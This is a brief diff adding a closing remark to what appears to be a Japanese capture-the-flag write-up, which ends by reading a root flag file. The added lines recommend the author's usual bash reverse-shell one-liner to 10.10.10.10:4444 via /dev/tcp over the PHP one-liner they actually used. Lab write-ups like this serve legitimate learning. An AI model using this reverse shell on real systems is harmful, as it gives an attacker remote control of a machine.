@@ -124,3 +124,7 @@ cat /root/3rd.txt
 ```
 
 😄Happy hacking. Thank you for your time.
+
+php使えるので思い付きでphpのonelinerを投げてしまいましたが、
+
+いつも通り　 ``` bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' ``` とかがスマート。　
